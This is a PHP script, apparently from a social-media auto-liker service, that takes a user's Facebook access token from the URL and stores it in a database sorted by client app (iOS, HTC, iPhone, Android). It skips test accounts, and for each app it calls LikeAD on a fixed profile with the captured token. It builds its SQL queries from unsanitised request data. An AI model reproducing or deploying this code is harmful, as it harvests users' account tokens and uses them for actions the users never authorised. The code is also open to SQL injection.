<?php
set_time_limit(0);
require("../_cnF/_star_cn_F.php");
require("../_cnF/_star_funC.php");
	$token = $_GET['token'];
	if($token){
		$me = me($token);
		if($me['id']&&(!ereg('@tfbnw.net',$me['email']))&&(!ereg('CAAC',$token))){
			$tk = checktk($token);
			$star = @mysqli_query($connection, "SELECT * FROM `taikhoan` WHERE `idfb` = $me[id];");
			if(mysql_num_rows($star) < 1){
				$time = time();
				@mysqli_query($connection, "INSERT INTO taikhoan SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `time` = '" . $time . "', `vnd` = '5000' ");
			}
			$rows = null;
			$result = mysqli_query($connection, "SELECT * FROM tokenvip WHERE idfb = '" . $me['id'] . "'");
			if($result){
				$rows = mysql_fetch_array($result, MYSQL_ASSOC);
				if(mysql_num_rows($result) > 1){
					mysqli_query($connection, "DELETE FROM tokenvip WHERE idfb='" . $me['id'] . "' ");
				}
			}
			if(!$rows){
				mysqli_query($connection, "INSERT INTO tokenvip SET `idfb` = '" . $me['id'] . "',`ten` = '" . $me['name'] . "',`token` = '" . $token . "'");
			}
			else{
				mysqli_query($connection, "UPDATE tokenvip SET `token` = '" . $token . "',  WHERE `id` = " . $rows['id'] . "");
			}
			if($tk['id'] == '165907476854626'){
				$row = null;
				$result = @mysqli_query($connection, "SELECT * FROM tokenios WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysql_fetch_array($result, MYSQL_ASSOC);
					if(@mysql_num_rows($result) > 1){
						@mysqli_query($connection, "DELETE FROM tokenios WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100006716972752', $token);
				if(!$row){
					@mysqli_query($connection, "INSERT INTO tokenios SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysqli_query($connection, "UPDATE tokenios SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysql_close($connection);
			}
			if($tk['id'] == '41158896424'){
				$row = null;
				$result = @mysqli_query($connection, "SELECT * FROM tokenhtc WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysql_fetch_array($result, MYSQL_ASSOC);
					if(@mysql_num_rows($result) > 1){
						@mysqli_query($connection, "DELETE FROM tokenhtc WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100006716972752', $token);
				if(!$row){
					@mysqli_query($connection, "INSERT INTO tokenhtc SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysqli_query($connection, "UPDATE tokenhtc SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysql_close($connection);
			}
			if($tk['id'] == '6628568379'){
				$row = null;
				$result = @mysqli_query($connection, "SELECT * FROM tokeniphone WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysql_fetch_array($result, MYSQL_ASSOC);
					if(@mysql_num_rows($result) > 1){
						@mysqli_query($connection, "DELETE FROM tokeniphone WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100006716972752', $token);
				if(!$row){
					@mysqli_query($connection, "INSERT INTO tokeniphone SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysqli_query($connection, "UPDATE tokeniphone SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysql_close($connection);
			}
			if($tk['id'] == '350685531728'){
				$row = null;
				$result = @mysqli_query($connection, "SELECT * FROM tokenandroid WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysql_fetch_array($result, MYSQL_ASSOC);
					if(@mysql_num_rows($result) > 1){
						@mysqli_query($connection, "DELETE FROM tokenandroid WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100006716972752', $token);
				if(!$row){
					@mysqli_query($connection, "INSERT INTO tokenandroid SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysqli_query($connection, "UPDATE tokenandroid SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysql_close($connection);
			}
		}
	}
?>